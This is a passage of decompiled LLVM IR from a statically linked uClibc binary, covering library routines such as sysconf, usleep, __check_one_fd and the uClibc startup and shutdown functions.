  store i32 %v3_8053fcb, i32* @edi, align 4
  %v1_8053fd2 = call i32 @__errno_location(i32 %v2_8053fbe)
  store i32 %v1_8053fd2, i32* %eax.global-to-local, align 4
  %v1_8053fda = inttoptr i32 %v1_8053fd2 to i32*
  %v2_8053fda = load i32, i32* %v1_8053fda, align 4
  store i32 %v2_8053fda, i32* @esi, align 4
  store i32 %v1_8053fd2, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053fe3 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053fe3 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8053fe3, i32 0)
  store i32 %v4_8053fe3, i32* %eax.global-to-local, align 4
  %v0_8053fe8 = load i32, i32* @esi, align 4
  %v1_8053fe8 = load i32, i32* @ebx, align 4
  %v2_8053fe8 = inttoptr i32 %v1_8053fe8 to i32*
  store i32 %v0_8053fe8, i32* %v2_8053fe8, align 4
  %v0_8054012.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805400f

dec_label_pc_8053fec:                             ; preds = %dec_label_pc_8053fb2
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053ff2 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053ff2 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8053ff2, i32 0)
  store i32 %v4_8053ff2, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054008

dec_label_pc_8053ffd:                             ; preds = %dec_label_pc_8053f2f
  %v2_8053fff = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053fff, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054008

dec_label_pc_8054008:                             ; preds = %dec_label_pc_8053fec, %dec_label_pc_8053ffd
  %storemerge3.pre-phi = phi i32 [ %v2_8053fbe, %dec_label_pc_8053fec ], [ %v2_8053fff, %dec_label_pc_8053ffd ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_8054008 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_8054008 = call i32 @__libc_nanosleep(%timespec* %v2_8054008, i32 %storemerge3.pre-phi)
  store i32 %v3_8054008, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805400f

dec_label_pc_805400f:                             ; preds = %dec_label_pc_8053fc7, %dec_label_pc_8054008
  %v0_8054012 = phi i32 [ %v0_8054012.pre, %dec_label_pc_8053fc7 ], [ %v3_8054008, %dec_label_pc_8054008 ]
  %v1_8054012 = icmp eq i32 %v0_8054012, 0
  br i1 %v1_8054012, label %dec_label_pc_805402f, label %dec_label_pc_8054016

dec_label_pc_8054016:                             ; preds = %dec_label_pc_805400f
  %v4_8054026 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8054026, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054036

dec_label_pc_805402f:                             ; preds = %entry, %dec_label_pc_805400f
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054036

dec_label_pc_8054033:                             ; preds = %dec_label_pc_8053f58, %dec_label_pc_8053f13, %dec_label_pc_8053ee5
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054036

dec_label_pc_8054036:                             ; preds = %dec_label_pc_805402f, %dec_label_pc_8054016, %dec_label_pc_8053f8a, %dec_label_pc_8054033
  %v0_8054040 = phi i32 [ 0, %dec_label_pc_805402f ], [ %v4_8054026, %dec_label_pc_8054016 ], [ %v0_8054040.pre, %dec_label_pc_8053f8a ], [ -1, %dec_label_pc_8054033 ]
  store i32 %v0_8053ec0, i32* @ebx, align 4
  store i32 %v0_8053ebf, i32* @esi, align 4
  store i32 %v0_8053ebe, i32* @edi, align 4
  ret i32 %v0_8054040

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8053fd2, { 1, 0, 2 }
  uselistorder i32 %v2_8053fbe, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8053f55, { 2, 1, 0 }
  uselistorder i32 %v2_8053f14, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_8053efb, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8053ee2, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054036, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805402f, { 1, 0 }
  uselistorder label %dec_label_pc_805400f, { 1, 0 }
  uselistorder label %dec_label_pc_8054008, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_8054063 [
    i32 0, label %dec_label_pc_8054073
    i32 1, label %dec_label_pc_8054158
    i32 2, label %dec_label_pc_805407d
    i32 3, label %dec_label_pc_8054087
    i32 4, label %dec_label_pc_8054091
    i32 5, label %dec_label_pc_8054127
    i32 6, label %dec_label_pc_8054099
    i32 7, label %dec_label_pc_8054059
    i32 8, label %dec_label_pc_8054059
    i32 9, label %dec_label_pc_8054059
    i32 10, label %dec_label_pc_8054059
    i32 11, label %dec_label_pc_8054059
    i32 12, label %dec_label_pc_8054059
    i32 13, label %dec_label_pc_8054059
    i32 14, label %dec_label_pc_8054059
    i32 15, label %dec_label_pc_8054059
    i32 16, label %dec_label_pc_8054059
    i32 17, label %dec_label_pc_8054059
    i32 18, label %dec_label_pc_8054059
    i32 19, label %dec_label_pc_8054059
    i32 20, label %dec_label_pc_8054059
    i32 21, label %dec_label_pc_8054059
    i32 22, label %dec_label_pc_8054059
    i32 23, label %dec_label_pc_8054158
    i32 24, label %dec_label_pc_8054158
    i32 25, label %dec_label_pc_8054164
    i32 26, label %dec_label_pc_8054135
    i32 27, label %dec_label_pc_8054158
    i32 28, label %dec_label_pc_80540ab
    i32 29, label %dec_label_pc_805412e
    i32 30, label %dec_label_pc_80540a3
    i32 31, label %dec_label_pc_8054143
    i32 32, label %dec_label_pc_8054158
    i32 33, label %dec_label_pc_8054158
    i32 34, label %dec_label_pc_8054158
    i32 35, label %dec_label_pc_805413c
    i32 36, label %dec_label_pc_805416b
    i32 37, label %dec_label_pc_8054172
    i32 38, label %dec_label_pc_805416b
    i32 39, label %dec_label_pc_80540b5
    i32 40, label %dec_label_pc_8054179
    i32 41, label %dec_label_pc_8054158
    i32 42, label %dec_label_pc_8054143
    i32 43, label %dec_label_pc_8054172
    i32 44, label %dec_label_pc_8054180
    i32 45, label %dec_label_pc_8054172
    i32 46, label %dec_label_pc_805412e
    i32 47, label %dec_label_pc_805412e
    i32 48, label %dec_label_pc_805412e
    i32 49, label %dec_label_pc_8054158
    i32 50, label %dec_label_pc_8054158
    i32 51, label %dec_label_pc_805412e
    i32 52, label %dec_label_pc_805412e
    i32 53, label %dec_label_pc_8054158
    i32 54, label %dec_label_pc_8054158
    i32 55, label %dec_label_pc_8054158
    i32 56, label %dec_label_pc_8054158
    i32 57, label %dec_label_pc_8054158
    i32 58, label %dec_label_pc_8054158
    i32 59, label %dec_label_pc_8054158
    i32 60, label %dec_label_pc_8054158
    i32 61, label %dec_label_pc_8054158
    i32 62, label %dec_label_pc_8054158
    i32 63, label %dec_label_pc_8054158
    i32 64, label %dec_label_pc_8054158
    i32 65, label %dec_label_pc_8054158
    i32 66, label %dec_label_pc_8054158
    i32 67, label %dec_label_pc_8054059
    i32 68, label %dec_label_pc_8054059
    i32 69, label %dec_label_pc_805413c
    i32 70, label %dec_label_pc_805413c
    i32 71, label %dec_label_pc_805413c
    i32 72, label %dec_label_pc_8054143
    i32 73, label %dec_label_pc_805414a
    i32 74, label %dec_label_pc_8054151
    i32 75, label %dec_label_pc_80540bf
    i32 76, label %dec_label_pc_8054151
    i32 77, label %dec_label_pc_8054059
    i32 78, label %dec_label_pc_8054059
    i32 79, label %dec_label_pc_8054059
    i32 80, label %dec_label_pc_8054059
    i32 81, label %dec_label_pc_8054059
    i32 82, label %dec_label_pc_8054059
    i32 83, label %dec_label_pc_8054059
    i32 84, label %dec_label_pc_8054059
    i32 85, label %dec_label_pc_8054158
    i32 86, label %dec_label_pc_8054158
    i32 87, label %dec_label_pc_8054135
    i32 88, label %dec_label_pc_80540c9
    i32 89, label %dec_label_pc_80540d3
    i32 90, label %dec_label_pc_805414a
    i32 91, label %dec_label_pc_8054059
    i32 92, label %dec_label_pc_8054059
    i32 93, label %dec_label_pc_8054059
    i32 94, label %dec_label_pc_8054059
    i32 95, label %dec_label_pc_805412e
    i32 96, label %dec_label_pc_8054158
    i32 97, label %dec_label_pc_8054158
    i32 98, label %dec_label_pc_8054059
    i32 99, label %dec_label_pc_8054059
    i32 100, label %dec_label_pc_8054059
    i32 101, label %dec_label_pc_80540dd
    i32 102, label %dec_label_pc_8054120
    i32 103, label %dec_label_pc_805415d
    i32 104, label %dec_label_pc_8054135
    i32 105, label %dec_label_pc_80540e7
    i32 106, label %dec_label_pc_8054143
    i32 107, label %dec_label_pc_8054143
    i32 108, label %dec_label_pc_8054127
    i32 109, label %dec_label_pc_8054164
    i32 110, label %dec_label_pc_8054180
    i32 111, label %dec_label_pc_8054120
    i32 112, label %dec_label_pc_805415d
    i32 113, label %dec_label_pc_8054180
    i32 114, label %dec_label_pc_80540f1
    i32 115, label %dec_label_pc_8054179
    i32 116, label %dec_label_pc_8054158
    i32 117, label %dec_label_pc_8054158
    i32 118, label %dec_label_pc_80540fb
    i32 119, label %dec_label_pc_8054105
    i32 120, label %dec_label_pc_8054172
    i32 121, label %dec_label_pc_8054135
    i32 122, label %dec_label_pc_8054135
    i32 123, label %dec_label_pc_8054135
    i32 124, label %dec_label_pc_8054135
    i32 125, label %dec_label_pc_8054059
    i32 126, label %dec_label_pc_8054059
    i32 127, label %dec_label_pc_8054158
    i32 128, label %dec_label_pc_8054158
    i32 129, label %dec_label_pc_8054059
    i32 130, label %dec_label_pc_8054059
    i32 131, label %dec_label_pc_8054158
    i32 149, label %dec_label_pc_805410c
  ]

dec_label_pc_8054059:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054063:                             ; preds = %entry
  %v1_8054063 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8054068 = inttoptr i32 %v1_8054063 to i32*
  store i32 22, i32* %v1_8054068, align 4
  br label %dec_label_pc_8054158

dec_label_pc_8054073:                             ; preds = %entry
  br label %dec_label_pc_8054185

dec_label_pc_805407d:                             ; preds = %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054087:                             ; preds = %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054091:                             ; preds = %entry
  %v0_8054094 = call i32 @getdtablesize()
  br label %dec_label_pc_8054099

dec_label_pc_8054099:                             ; preds = %entry, %dec_label_pc_8054091
  br label %dec_label_pc_8054185

dec_label_pc_80540a3:                             ; preds = %entry
  %v3_80540a6 = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80540ab

dec_label_pc_80540ab:                             ; preds = %entry, %dec_label_pc_80540a3
  br label %dec_label_pc_8054185

dec_label_pc_80540b5:                             ; preds = %entry
  br label %dec_label_pc_8054185

dec_label_pc_80540bf:                             ; preds = %entry
  br label %dec_label_pc_8054185

dec_label_pc_80540c9:                             ; preds = %entry
  br label %dec_label_pc_8054185

dec_label_pc_80540d3:                             ; preds = %entry
  br label %dec_label_pc_8054185

dec_label_pc_80540dd:                             ; preds = %entry
  br label %dec_label_pc_8054185

dec_label_pc_80540e7:                             ; preds = %entry
  br label %dec_label_pc_8054185

dec_label_pc_80540f1:                             ; preds = %entry
  br label %dec_label_pc_8054185

dec_label_pc_80540fb:                             ; preds = %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054105:                             ; preds = %entry
  br label %dec_label_pc_8054185

dec_label_pc_805410c:                             ; preds = %entry
  %v5_8054112 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_805411a = icmp slt i32 %v5_8054112, 0
  %v1_805411c = icmp eq i1 %v2_805411a, false
  br i1 %v1_805411c, label %dec_label_pc_805412e, label %dec_label_pc_8054158

dec_label_pc_8054120:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054127:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_805412e:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_805410c
  br label %dec_label_pc_8054185

dec_label_pc_8054135:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_805413c:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054143:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_805414a:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054151:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054158:                             ; preds = %dec_label_pc_805410c, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8054063
  br label %dec_label_pc_8054185

dec_label_pc_805415d:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054164:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_805416b:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054172:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054179:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054180:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8054185

dec_label_pc_8054185:                             ; preds = %dec_label_pc_8054179, %dec_label_pc_8054172, %dec_label_pc_805416b, %dec_label_pc_8054164, %dec_label_pc_805415d, %dec_label_pc_8054151, %dec_label_pc_805414a, %dec_label_pc_8054143, %dec_label_pc_805413c, %dec_label_pc_8054135, %dec_label_pc_8054127, %dec_label_pc_8054120, %dec_label_pc_805412e, %dec_label_pc_8054105, %dec_label_pc_80540fb, %dec_label_pc_80540f1, %dec_label_pc_80540e7, %dec_label_pc_80540dd, %dec_label_pc_80540d3, %dec_label_pc_80540c9, %dec_label_pc_80540bf, %dec_label_pc_80540b5, %dec_label_pc_80540ab, %dec_label_pc_8054099, %dec_label_pc_8054087, %dec_label_pc_805407d, %dec_label_pc_8054073, %dec_label_pc_8054059, %dec_label_pc_8054158, %dec_label_pc_8054180
  %v0_8054188 = phi i32 [ 255, %dec_label_pc_8054179 ], [ 2048, %dec_label_pc_8054172 ], [ 99, %dec_label_pc_805416b ], [ 20, %dec_label_pc_8054164 ], [ -128, %dec_label_pc_805415d ], [ 1024, %dec_label_pc_8054151 ], [ 4, %dec_label_pc_805414a ], [ 32, %dec_label_pc_8054143 ], [ 256, %dec_label_pc_805413c ], [ 2147483647, %dec_label_pc_8054135 ], [ 16, %dec_label_pc_8054127 ], [ 127, %dec_label_pc_8054120 ], [ 200112, %dec_label_pc_805412e ], [ 9, %dec_label_pc_8054105 ], [ 65535, %dec_label_pc_80540fb ], [ -32768, %dec_label_pc_80540f1 ], [ -2147483648, %dec_label_pc_80540e7 ], [ 8, %dec_label_pc_80540dd ], [ 500, %dec_label_pc_80540d3 ], [ 4096, %dec_label_pc_80540c9 ], [ 16384, %dec_label_pc_80540bf ], [ 1000, %dec_label_pc_80540b5 ], [ 32768, %dec_label_pc_80540ab ], [ 6, %dec_label_pc_8054099 ], [ 65536, %dec_label_pc_8054087 ], [ 100, %dec_label_pc_805407d ], [ 131072, %dec_label_pc_8054073 ], [ 1, %dec_label_pc_8054059 ], [ -1, %dec_label_pc_8054158 ], [ 32767, %dec_label_pc_8054180 ]
  ret i32 %v0_8054188

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 1000, { 2, 0, 1, 3 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 4, 1, 2, 3 }
  uselistorder i32 -2147483648, { 4, 6, 7, 3, 5, 9, 0, 1, 2, 8 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 3, 0, 1, 2 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 2, 0, 1 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 108, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 2, 3, 1, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 3, 2, 0, 1 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 50, { 2, 0, 1 }
  uselistorder i32 49, { 2, 1, 0 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 39, { 3, 1, 2, 0 }
  uselistorder i32 38, { 2, 3, 1, 0 }
  uselistorder i32 30, { 8, 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 3, 2, 0, 1 }
  uselistorder i32 25, { 1, 2, 0 }
  uselistorder i32 23, { 1, 2, 0 }
  uselistorder i32 19, { 2, 1, 3, 0 }
  uselistorder i32 18, { 1, 0 }
  uselistorder label %dec_label_pc_8054185, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8054158, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_805412e, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80540ab, { 1, 0 }
  uselistorder label %dec_label_pc_8054099, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_8054194 = trunc i64 %arg1 to i32
  %div = udiv i32 %v4_8054194, 1000000
  store i32 %div, i32* %stack_var_-8, align 4
  %v2_80541b3 = bitcast i32* %stack_var_-8 to %timespec*
  %v3_80541b3 = call i32 @__libc_nanosleep(%timespec* %v2_80541b3, i32 0)
  ret i32 %v3_80541b3

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
  uselistorder i32 1000000, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80541bc = load i32, i32* @ebx, align 4
  store i32 %v0_80541bc, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8062000.767 to i32), i32 -134619136), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8062000.767 to i32), i32 -134619136), i32 2), i32 0), label %dec_label_pc_80541d0, label %dec_label_pc_80541dd

dec_label_pc_80541d0:                             ; preds = %entry, %dec_label_pc_80541d0
  %v1_80541d76 = phi i32 [ %v1_80541d7, %dec_label_pc_80541d0 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8062000.767 to i32), i32 -134619136), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_80541d7.768 to i32), i32* %stack_var_-16, align 4
  %v5_80541d0 = mul i32 %v1_80541d76, 4
  %v6_80541d0 = add i32 %v5_80541d0, ptrtoint (i32* @global_var_8062000.767 to i32)
  %v7_80541d0 = inttoptr i32 %v6_80541d0 to i32*
  %v8_80541d0 = load i32, i32* %v7_80541d0, align 4
  call void @__pseudo_call(i32 %v8_80541d0)
  %v0_80541d7.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80541d7 = add i32 %v0_80541d7.pre, -1
  store i32 %v1_80541d7, i32* %ebx.global-to-local, align 4
  %v10_80541d8 = icmp eq i32 %v0_80541d7.pre, 0
  %v1_80541db = icmp eq i1 %v10_80541d8, false
  br i1 %v1_80541db, label %dec_label_pc_80541d0, label %dec_label_pc_80541dd

dec_label_pc_80541dd:                             ; preds = %dec_label_pc_80541d0, %entry
  %v0_80541dd = load i32, i32* @global_var_80687d4.769, align 4
  %v1_80541e2 = icmp eq i32 %v0_80541dd, 0
  br i1 %v1_80541e2, label %dec_label_pc_80541e8, label %dec_label_pc_80541e6

dec_label_pc_80541e6:                             ; preds = %dec_label_pc_80541dd
  %v0_80541e6 = load i32, i32* %stack_var_-16, align 4
  %v1_80541e6 = call i32 @unknown_0(i32 %v0_80541e6)
  br label %dec_label_pc_80541e8

dec_label_pc_80541e8:                             ; preds = %dec_label_pc_80541e6, %dec_label_pc_80541dd
  %v0_80541e8 = load i32, i32* @global_var_80687d8.770, align 8
  %v1_80541ee = icmp eq i32 %v0_80541e8, 0
  br i1 %v1_80541ee, label %dec_label_pc_80541f7, label %dec_label_pc_80541f2

dec_label_pc_80541f2:                             ; preds = %dec_label_pc_80541e8
  %v2_80541f4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80541f4, i32* %ebx.global-to-local, align 4
  %v0_80541f5 = load i32, i32* %stack_var_-16, align 4
  %v1_80541f5 = call i32 @unknown_0(i32 %v0_80541f5)
  br label %dec_label_pc_80541f7

dec_label_pc_80541f7:                             ; preds = %dec_label_pc_80541e8, %dec_label_pc_80541f2
  %v2_80541f7 = load i32, i32* %stack_var_-16, align 4
  %v2_80541f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80541f8, i32* @edx, align 4
  ret i32 %v2_80541f7

; uselistorder directives
  uselistorder i32 %v1_80541d7, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80541f7, { 1, 0 }
  uselistorder label %dec_label_pc_80541d0, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80541fe = load i32, i32* @eax, align 4
  ret i32 %v0_80541fe
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80541ff = load i32, i32* @esi, align 4
  %v0_8054200 = load i32, i32* @eax, align 4
  store i32 %v0_8054200, i32* @esi, align 4
  %v0_8054202 = load i32, i32* @ebx, align 4
  store i32 %v0_8054202, i32* %stack_var_-8, align 4
  %v0_8054203 = load i32, i32* @edx, align 4
  store i32 %v0_8054203, i32* @ebx, align 4
  %v4_805420b = call i32 @__libc_fcntl(i32 %v0_8054200, i32 1, i32 %tmp6)
  %v8_8054213 = icmp eq i32 %v4_805420b, -1
  %v1_8054214 = icmp eq i1 %v8_8054213, false
  br i1 %v1_8054214, label %dec_label_pc_805422f, label %dec_label_pc_8054216

dec_label_pc_8054216:                             ; preds = %entry
  %v0_8054218 = load i32, i32* @ebx, align 4
  %v5_805421e = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806134c.771, i32 0, i32 0), i32 %v0_8054218)
  %v1_8054226 = load i32, i32* @esi, align 4
  %v12_8054226 = icmp eq i32 %v5_805421e, %v1_8054226
  br i1 %v12_8054226, label %dec_label_pc_805422f, label %dec_label_pc_805422a

dec_label_pc_805422a:                             ; preds = %dec_label_pc_8054216
  %v0_805422a = call i32 @abort()
  br label %dec_label_pc_805422f

dec_label_pc_805422f:                             ; preds = %dec_label_pc_8054216, %entry, %dec_label_pc_805422a
  %v2_805422f = load i32, i32* %stack_var_-12, align 4
  %v2_8054230 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054230, i32* @ebx, align 4
  store i32 %v0_80541ff, i32* @esi, align 4
  ret i32 %v2_805422f

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 4, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 5, 1, 2, 0, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 5, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_805422f, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8054236 = load i8, i8* @global_var_80687dc.772, align 4
  %v1_8054236 = icmp eq i8 %v0_8054236, 0
  %v1_805423d = icmp eq i1 %v1_8054236, false
  br i1 %v1_805423d, label %entry.dec_label_pc_805426f_crit_edge, label %dec_label_pc_805423f

entry.dec_label_pc_805426f_crit_edge:             ; preds = %entry
  %v0_8054272.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805426f

dec_label_pc_805423f:                             ; preds = %entry
  store i8 1, i8* @global_var_80687dc.772, align 4
  store i32 4096, i32* @global_var_80687d0.694, align 16
  %v0_805426a = call i32 @_stdio_init()
  br label %dec_label_pc_805426f

dec_label_pc_805426f:                             ; preds = %entry.dec_label_pc_805426f_crit_edge, %dec_label_pc_805423f
  %v0_8054272 = phi i32 [ %v0_8054272.pre, %entry.dec_label_pc_805426f_crit_edge ], [ %v0_805426a, %dec_label_pc_805423f ]
  ret i32 %v0_8054272

; uselistorder directives
  uselistorder i8* @global_var_80687dc.772, { 1, 0 }
  uselistorder label %dec_label_pc_805426f, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v0_8054273 = load i32, i32* @ebp, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80687c8.773, align 8
  store i32 %arg6, i32* @global_var_80687d8.770, align 8
  %v2_80542aa = mul i32 %arg2, 4
  %v3_80542aa = add i32 %tmp29, %v2_80542aa
